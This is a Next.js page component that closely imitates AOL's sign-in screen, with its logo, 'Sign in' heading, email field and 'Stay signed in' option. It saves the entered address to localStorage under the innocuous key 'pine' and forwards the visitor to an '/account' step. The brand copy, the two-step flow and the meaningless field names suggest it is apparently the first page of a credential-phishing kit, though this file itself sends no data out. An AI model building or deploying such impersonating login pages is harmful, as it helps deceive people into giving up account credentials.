import Image from 'next/image'
import { Inter } from 'next/font/google'
import { useState } from 'react'
import { useRouter } from 'next/router'

const inter = Inter({ subsets: ['latin'] })

export default function Home() {

  const [pine, setPine] = useState('')
   const router = useRouter()
  console.log(pine);

  const handleSubmit = () => {
    if (pine) {
      localStorage.setItem('pine', pine)
      router.push('/account')
    }
  }
  
  return (
   <main className='sm:h-screen'>
    <header className='h-20 px-8 sm:flex justify-between pt-7 hidden'>
     <img src="/aol-logo-black.png" alt="logo" className='w-[6.5rem] h-10' />
     <p className='text-blue-500 text-sm'>
        Help
      </p>
    </header>

    <div className='bg-gray-100 sm:h-[85%] sm:flex sm:justify-between'>

      <div className=''></div>

      <div className='bg-white border border-gray-50 sm:h-[90%] sm:w-[367px] shadow-lg sm:mt-3 sm:mr-5 lg:mr-20 px-8 h-screen flex flex-col items-center'>
        <img src="/aol-logo-black.png" alt="logo" className='w-[6.5rem] h-10 mt-8' />

        <h3 className='mt-12 text-xl font-bold'>
          Sign in
        </h3>

        <form className='w-full mt-16' onSubmit={(e) => {
          e.preventDefault()
          handleSubmit()
          }}>
           <div className='relative'>
            <input 
                      type="email" 
                      className='peer placeholder-transparent 
                      w-full h-10 outline-none 
                      border-b border-gray-400'
                      value={pine} 
                      onChange={(e) => {
                        setPine(e.target.value)
                      }}
                      id='jenneta' 
                      name='jenneta' 
                      placeholder='Username, email or mobile'
                      required
                      />
            <label
                htmlFor="jenneta" 
                className='absolute left-0 -top-3.5
                  text-black text-sm
                  peer-placeholder-shown:text-base
                  peer-placeholder-shown:top-2
                  peer-placeholder-shown:text-gray-400
                  peer-focus:-top-3.5 
                  peer-focus:text-sm 
                  peer-focus:text-black
                  transition-all'>
                Username, email or mobile
              </label>
           </div>

           <input 
           type="submit" 
           value="Next" 
           className='bg-[#3399FF] h-11 w-full mt-6 text-white cursor-pointer hover:bg-opacity-80'/>

           <div className='flex justify-between mt-4'>
            <div className='flex space-x-2'>
              <input type="checkbox" />
              <p className='text-[#3399FF]'>Stay signed in</p>
            </div>

            <p className='text-[#3399FF]'>
              Forgot username?
            </p>
           </div>

           <button className='border border-[#3399FF] h-10 w-full mt-4 text-[#3399FF]'>
             Create and account
           </button>
        </form>

      </div>

    </div>
    <footer 
    style={{
      fontSize: '0.6rem'
    }}
    className='text-xs text-[#3399FF] text-center pt-2 hidden sm:block'>
     Terms {' '}|{' '} Privacy
    </footer>
   </main>
  )
}
